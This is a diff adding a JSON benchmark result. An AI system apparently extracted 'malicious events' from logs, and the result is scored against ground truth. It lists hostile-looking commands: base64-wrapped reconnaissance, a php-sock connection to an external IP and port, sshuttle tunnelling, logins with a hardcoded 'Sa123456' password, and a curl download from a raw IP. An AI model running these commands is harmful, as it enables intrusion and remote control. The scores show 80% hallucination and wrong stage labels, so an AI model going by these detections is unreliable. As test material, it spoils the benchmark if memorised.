@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c echo end:d2hvYW1pJmlmY29uZmln",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmlmY29uZmlndHlwZUBkb2NrZXRidWlsZXMuamFu ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sed -n s/^cpu\\s//p ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sshuttle --raw -vvv -o --keepalive-tilde sshuttle:170.130.137.196:3128 ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "mysql -uroot -pSa123456 -h192.168.0.0/24 ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --disable ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sleep 1 ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "/usr/sbin/sshd -D -R ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "php-sock -t 37.110.236.138 -p 41236 ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "ls -l ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "curl -L -s -o - http://125.114.216.235/torrent/X-Cool-Linux-v1-pod1337.tar.gz\r\n ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -s -o \"install -t /root/.local/share/bash-completion/completions/ -C -f /root/perl5/perlbrew/etc/bash_completion.d/perl5-perlbrew <<EOF\r\nperl5_perlbrew_completion()\r\nset_completer perl5_perlbrew_completion\r\ncomplete -cf perl5_perlbrew\r\nEOF\"\r\n ",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 80167,
+      "completion_tokens": 1889,
+      "total_tokens": 82056,
+      "wall_clock_s": 22.92,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.07692307692307693,
+      "recall": 0.14285714285714285,
+      "f1": 0.1,
+      "tp": 1,
+      "fp": 12,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 13,
+      "fn": 7,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.8,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 80167,
+      "completion_tokens": 1889,
+      "total_tokens": 82056,
+      "wall_clock_s": 22.92,
+      "parse_retries": 0
+    }
+  }
+}
